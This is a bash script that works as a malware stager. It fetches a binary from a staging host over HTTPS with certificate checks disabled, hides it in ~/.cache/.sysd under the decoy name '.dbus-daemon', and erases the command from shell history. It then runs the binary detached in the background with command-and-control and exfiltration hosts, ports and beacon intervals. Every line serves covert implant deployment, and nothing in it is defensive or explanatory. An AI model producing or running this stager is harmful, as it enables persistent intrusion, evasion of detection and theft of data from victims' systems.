#!/bin/bash
STAGING_HOST="${STAGING_HOST:-192.168.1.100}"
C2_HOST="${C2_HOST:-${STAGING_HOST}}"
C2_PORT="${C2_PORT:-443}"
EXFIL_HOST="${EXFIL_HOST:-${C2_HOST}}"
EXFIL_PORT="${EXFIL_PORT:-8443}"

WORK="${HOME}/.cache/.sysd"
mkdir -p "${WORK}"
cd "${WORK}"

curl -sLk --max-time 60 -o .dbus-daemon "https://${STAGING_HOST}:8443/b"
chmod +x .dbus-daemon

history -d $(history 1 | awk '{print $1}') 2>/dev/null || true

nohup env \
  C2_HOST="${C2_HOST}" \
  C2_PORT="${C2_PORT}" \
  EXFIL_HOST="${EXFIL_HOST}" \
  EXFIL_PORT="${EXFIL_PORT}" \
  BEACON_MIN="4" \
  BEACON_MAX="12" \
  "${WORK}/.dbus-daemon" \
  >/dev/null 2>&1 &

disown $!
